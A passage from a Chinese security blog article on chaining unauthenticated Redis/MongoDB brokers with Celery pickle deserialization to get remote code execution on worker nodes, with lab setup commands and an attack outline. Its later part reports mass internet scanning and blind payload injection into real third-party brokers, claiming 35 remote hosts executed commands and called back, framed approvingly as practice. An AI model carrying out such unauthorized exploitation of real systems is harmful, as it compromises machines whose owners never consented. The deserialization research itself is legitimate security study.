exp(&#39;192.168.99.100&#39;)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">为了测试攻击脚本，首先需要在&nbsp;192.168.99.100&nbsp;上开启 Redis 服务并配置为外部可连且无需验证，然后在本地起一个 SimpleHTTPServer 用于接收节点执行命令的请求，最后可直接通过终端配置 Broker 为 Redis 起一个默认的 worker：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"></span></p><pre class="brush:plain;toolbar:false">celery&nbsp;worker&nbsp;--broker=&#39;redis://:@192.168.99.100/0&#39;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">整个过程演示：</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"><br/></span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/15-44" rel="attachment wp-att-89661"><img src="http://p2.qhimg.com/t01e0c95b7ca0e7dbd9.gif" alt="15" width="960" height="503" data-tag="bdshare" style="box-sizing: border-box; border: 0px; vertical-align: middle; max-width: 100%; margin: 0px auto; display: block; height: auto; text-align: center;"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到通过往消息队列中插入恶意消息，被分布式节点 worker 获取解析后触发了反序列化漏洞导致了远程命令执行。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">互联网案例检测</span></strong></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">上一节内容通过实际的代码和演示过程说明了如何通过特征去验证消息队列中间件是否作为了 Celery 分布式框架的一部分，那么互联网中是否真的存在这样的实例呢。这里再次理一下针对 Celery 分布式节点攻击的思路：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1、找寻那有着未授权访问且用于 Celery 消息队列传递的中间件服务；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2、往消息队列中插入恶意消息数据，因无法确定目标是否允许进行&nbsp;pickle&nbsp;方式序列化，所以会进行 Payload 盲打；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3、等待分布式节点取走消息进行解析，触发反序列化漏洞执行任意代码；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先针对第一点，利用脚本去扫描互联网中存在未授权访问且用于 Celery 消息队列传递的 Redis 和 MongoDB 服务。通过扫描得到未授权访问的 Redis 有&nbsp;14000+&nbsp;个，而未授权访问的 MongoDB 同样也有&nbsp;14000+&nbsp;个。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">针对&nbsp;14000+&nbsp;个存在未授权访问的 Redis 服务使用上一节的验证脚本（celery_broker_redis_check.py）进行批量检测，得到了&nbsp;86&nbsp;个目标满足要求，扫描过程截图：</span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/16-43" rel="attachment wp-att-89662"><img src="http://p9.qhimg.com/t015e6bae500f722865.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">同样的针对&nbsp;14000+&nbsp;个存在未授权访问的 MongoDB 服务进行批量检测，得到了&nbsp;22&nbsp;个目标满足要求，扫描过程截图：</span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/17-35" rel="attachment wp-att-89663"><img src="http://p9.qhimg.com/t0143ca050085d08483.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">根据结果来看，虽然最终满足条件的目标数量并不多，但是这足以说明利用消息注入对分布式节点进行攻击的思路是可行的，并且在消息队列中间件后面有多少个 worker 节点并不知道，危害的不仅仅是 Broker 而是后面的整个节点。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">由于具体的攻击 Payload 使用了盲打，所以不能直接获取远端成功执行命令的结果，所以这里借助外部服务来监听连接请求并进行标识，若一个分布式节点成功触发了漏洞，它会去请求外部服务器。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">针对 Redis 检测过程截图：</span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/18-26" rel="attachment wp-att-89665"><img src="http://p2.qhimg.com/t01f99b5544bc202ae1.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">其中服务器上收到了&nbsp;32&nbsp;个成功执行命令并回连的请求：</span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/19-25" rel="attachment wp-att-89666"><img src="http://p5.qhimg.com/t01fee1072fe946edde.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">同样的针对 MongoDB 检测过程截图：</span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/20-23" rel="attachment wp-att-89667"><img src="http://p7.qhimg.com/t019f3ba288dd453cce.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">其中服务器上成功收到&nbsp;3&nbsp;个成功执行命令并回连的请求：</span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/21-21" rel="attachment wp-att-89668"><img src="http://p0.qhimg.com/t0139bcd5015da9c13d.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">从最后得到的数据来看，成功触发漏洞导致远程命令执行的目标数量并不多，而且整个利用条件也比较苛刻，但就结论而言，已经直接解答了文章一开始所提出的疑问，利用多个漏洞对分布式节点进行攻击的思路也成功得到了实践。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">（写了那么多，更多的想把自己平常折腾和研究的一些点给分享出来，理论应用到实战，没有案例的漏洞都不能称之为好漏洞。将一些想法和思路付之于实践，终究会得到验证。）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">相关链接</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><a href="http://www.celeryproject.org/" style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Celery 分布式框架项目 – http://www.celeryproject.org/</a></p><p style="text-indent: 2em; text-align: left;"><a href="https://docs.python.org/2/library/pickle.html" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Python “pickle” 模块文档 – https://docs.python.org/2/library/pickle.html</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><a href="http://rickgray.me/2015/09/12/django-command-execution-analysis.html" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;">Django 远程命令执行漏洞详解 – http://rickgray.me/2015/09/12/django-command-execution-analysis.html</a></span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/3064.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】漏洞组合拳——攻击分布式节点 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3064" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
